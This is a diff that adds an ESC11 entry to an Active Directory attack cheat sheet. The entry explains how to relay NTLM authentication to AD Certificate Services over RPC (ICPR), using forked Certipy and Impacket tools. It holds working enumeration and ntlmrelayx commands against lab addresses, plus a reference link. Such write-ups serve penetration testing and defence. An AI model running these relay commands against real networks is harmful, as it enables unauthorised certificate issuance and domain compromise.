@@ -85,6 +85,7 @@
       - [ESC7 - Vulnerable Certificate Authority Access Control](#esc7---vulnerable-certificate-authority-access-control)
       - [ESC8 - AD CS Relay Attack](#esc8---ad-cs-relay-attack)
       - [ESC9 - No Security Extension](#esc9---no-security-extension)
+      - [ESC11 - Relaying NTLM to ICPR](#esc11---relaying-ntlm-to-icpr)
       - [Certifried CVE-2022-26923](#certifried-cve-2022-26923)
       - [Pass-The-Certificate](#pass-the-certificate)
     - [Active Directory Federation Services](#active-directory-federation-services)
@@ -2589,6 +2590,20 @@ Jane@corp.local is allowed to enroll in the certificate template ESC9 that speci
     # Add -domain <domain> to your command line since there is no domain specified in the certificate.
     ```
 
+#### ESC11 - Relaying NTLM to ICPR
+
+> Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
+
+Requirements:
+* [sploutchy/Certipy](https://github.com/sploutchy/Certipy) - Certipy fork
+* [sploutchy/impacket](https://github.com/sploutchy/impacket) - Impacket fork
+
+Exploitation:
+1. Look for `Enforce Encryption for Requests: Disabled` in `certipy find -u user@dc1.lab.local -p 'REDACTED' -dc-ip 10.10.10.10 -stdout` output
+2. Setup a relay using Impacket ntlmrelay and trigger a connection to it.
+    ```ps1
+    ntlmrelayx.py -t rpc://10.10.10.10 -rpc-mode ICPR -icpr-ca-name lab-DC-CA -smb2support
+    ```
 
 #### Certifried CVE-2022-26923
 
@@ -4106,3 +4121,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [Exploring SCCM by Unobfuscating Network Access Accounts - @_xpn_ - Posted on 2022-07-09](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)
 * [.NET Advanced Code Auditing XmlSerializer Deserialization Vulnerability - April 2, 2019 by znlive](https://znlive.com/xmlserializer-deserialization-vulnerability)
 * [Practical guide for Golden SAML - Practical guide step by step to create golden SAML](https://nodauf.dev/p/practical-guide-for-golden-saml/)
+* [Relaying to AD Certificate Services over RPC - NOVEMBER 16, 2022 - SYLVAIN HEINIGER](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
